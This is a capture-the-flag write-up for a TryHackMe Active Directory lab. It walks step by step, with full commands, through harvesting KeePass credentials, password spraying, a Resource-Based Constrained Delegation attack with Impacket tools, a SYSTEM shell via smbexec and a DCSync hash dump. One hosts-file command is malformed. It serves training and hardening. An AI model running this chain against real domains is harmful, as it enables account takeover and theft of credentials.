# [THM] Forward — Writeup
---

https://tryhackme.com/room/forwardchallenge

**Difficulty:** Medium
**Tags:** Active Directory, BloodHound, KeePass, Password Spray, RBCD, Kerberos, Impacket
**Solved:** June 2026

---

## Overview

Forward drops you straight into a compromised Active Directory environment — initial credentials are handed to you, and the challenge is seeing how far you can go from there. No web exploitation, no initial foothold puzzle. Just AD lateral movement and privilege escalation from a low-privileged user all the way to Domain Admin.

The attack chain:

```
j.smith → t.jones → r.williams → Administrator (DA)
```

Each hop requires a different technique: credential harvesting from a KeePass database, password spraying, and finally a Resource-Based Constrained Delegation (RBCD) attack to take over the Domain Controller.

---

## Recon

```bash
sudo nmap -p- 10.114.152.118 -sV --min-rate=1000 -T4
```

```
PORT      STATE SERVICE
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (Domain: ctf.local)
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
9389/tcp  open  mc-nmf        .NET Message Framing

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The port layout immediately tells us we're dealing with a Domain Controller — DNS on 53, Kerberos on 88, LDAP on 389/3268, AD Web Services on 9389. The hostname `DC01` is visible in the nmap output. No web surface, no unusual ports. This engagement lives entirely in AD.

Add the DC to `/etc/hosts`:

```bash
echo "10.114.152.118  DC01.ctf.local ctf.local DC01" >> sudo -tee -a /etc/hosts
```

---

## Domain Enumeration

### SMB

Starting with SMB as `j.smith`:

```bash
nxc smb DC01.ctf.local -u 'j.smith' -p 'JSmith@IT2024' --shares
```

A non-default share `Downloads` shows up with read access, but connecting to it reveals nothing inside. Not our entry point.

### BloodHound

Rather than manually chasing AD relationships, we collect everything at once:

```bash
bloodhound-python -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local -dc DC01.ctf.local -ns 10.112.190.54 -c All --zip
```

Running this remotely from Kali is far more practical than copying SharpHound onto the target. Once ingested into the BloodHound GUI, three things stand out:

- `j.smith` is in the **Remote Desktop Users** group — we can RDP directly into the DC
- `SVC.HELPDESK` is Kerberoastable, but has no meaningful permissions — red herring
- `Administrator` is the only Domain Admin
- There's a path from `r.williams` to the DC — we'll come back to this

---

## j.smith → t.jones — KeePass Credential Harvest

We RDP into the DC as `j.smith` and check the user's profile. Inside `Documents` there's a `Database.kdbx` file — a KeePass password database.

KeePass2 is installed on the machine. When opening the database, it prompts for a master password — but there's also an option to authenticate using the **current Windows user account**. Since we're already logged in as `j.smith`, no master password is needed.

> This is a common misconfiguration: KeePass databases secured only by a Windows account login offer no protection to anyone already operating as that user.

Inside the database we find credentials for `t.jones`:

```
t.jones : Helpdesk01!
```

We verify with nxc:

```bash
nxc smb DC01.ctf.local -u 't.jones' -p 'Helpdesk01!'
```

Valid. But checking BloodHound, `t.jones` has no interesting permissions and nothing useful in their profile remotely. Time to use these credentials differently.

---

## t.jones → r.williams — Password Spray

With valid credentials we can pull a full user list from the domain:

```bash
nxc smb DC01.ctf.local -u 't.jones' -p 'Helpdesk01!' --users > users.txt
```

Then spray `Helpdesk01!` across all accounts — the assumption being that the same helpdesk-managed password might have been reused:

```bash
nxc smb DC01.ctf.local -u users.txt -p 'Helpdesk01!' --continue-on-success
```

`r.williams` comes back as a hit. Same password, different account.

Back in BloodHound, we now have an active path: `r.williams` has `AddAllowedToAct` over `DC01$`.

---

## r.williams → Administrator — RBCD Attack

### What is AddAllowedToAct?

`AddAllowedToAct` means `r.williams` can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC object. This attribute controls which accounts are trusted to delegate — and writing to it is the core primitive of a **Resource-Based Constrained Delegation (RBCD)** attack.

The abuse chain:
1. Create an attacker-controlled machine account
2. Write it into the DC's delegation attribute
3. Use S4U2Self/S4U2Proxy to request a Kerberos ticket as Administrator
4. Use that ticket to authenticate to the DC

### Step 1 — Create a Machine Account

```bash
addcomputer.py \
  -computer-name 'ATTACKERSYSTEM$' \
  -computer-pass 'Summer2018!' \
  -dc-host DC01 \
  -domain-netbios ctf.local \
  'ctf.local/r.williams:Helpdesk01!'
```

### Step 2 — Write Delegation Attribute

```bash
rbcd.py \
  -dc-ip 10.112.190.54 \
  -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to 'DC01$' \
  -action 'write' \
  'ctf.local/r.williams:Helpdesk01!'
```

`ATTACKERSYSTEM$` is now trusted to act on behalf of any user when accessing `DC01`.

### Step 3 — Request a Kerberos Service Ticket

```bash
getST.py \
  -spn 'cifs/DC01.ctf.local' \
  -impersonate 'Administrator' \
  'ctf.local/ATTACKERSYSTEM$:Summer2018!'
```

`cifs` is the SMB file sharing service — we're requesting a ticket that says "I am Administrator, accessing SMB on DC01". The ticket is saved as a `.ccache` file.

### Step 4 — Authenticate as Administrator

Export the ticket so Impacket tools pick it up automatically:

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

Use `smbexec.py` to land a shell on the DC:

```bash
smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

We're in as `NT AUTHORITY\SYSTEM` on the Domain Controller.

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

### Bonus — Dump All Credentials

With DA-level Kerberos access, we can run a DCSync against the entire domain:

```bash
secretsdump.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

This dumps NTLM hashes for every account in the domain — full persistence, game over.

---

## A Note on the Red Herring

On `r.williams`' Desktop there's a file `Automation-Notice.txt` hinting at background processes and temp files. This is a decoy — investigating it leads nowhere. When BloodHound already shows you a clear path to DA, trust the graph.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nxc` (NetExec) | SMB auth, share enum, user list, password spray |
| `bloodhound-python` | Remote AD data collection |
| `BloodHound GUI` | Attack path visualization |
| `KeePass2` | Opening the `.kdbx` database on the target |
| `addcomputer.py` | Creating the attacker machine account |
| `rbcd.py` | Writing delegation attribute |
| `getST.py` | Requesting impersonation ticket via S4U2Proxy |
| `smbexec.py` | Shell via Kerberos ticket |
| `secretsdump.py` | DCSync — dumping all domain hashes |

---

## Key Takeaways

- BloodHound should be your first move in any AD engagement — manually tracing permission chains wastes time that the graph gives you in seconds
- KeePass secured only by a Windows account is essentially unlocked for anyone operating as that user — master passwords exist for a reason
- Password reuse across accounts managed by the same helpdesk team is extremely common in real environments
- `AddAllowedToAct` is a frequently overlooked permission during AD hardening — it's not as loud as `GenericAll` but the impact is identical

---

*Tags: Active Directory · TryHackMe · BloodHound · RBCD · Kerberos · Impacket · Lateral Movement · CTF*